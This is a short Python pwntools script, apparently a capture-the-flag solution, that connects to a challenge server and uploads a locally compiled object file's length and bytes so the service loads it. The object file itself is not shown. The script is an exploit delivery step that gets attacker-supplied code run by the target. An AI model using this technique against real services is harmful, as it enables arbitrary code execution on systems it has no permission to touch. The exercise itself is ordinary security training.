from pwn import *

# Just compile a shared object and send it in

p = remote("challs.pwnoh.io", 13373)
# p = process("./thank")

with open("thing.o", "rb") as f:
    data = f.read()

with open("payload", "wb") as f:
    f.write(str(len(data)).encode())
    f.write(b"\n")
    f.write(data)

print(p.recv().decode())
p.sendline(str(len(data)).encode())
print(p.recv().decode())
p.sendline(data)
print(p.recv().decode())
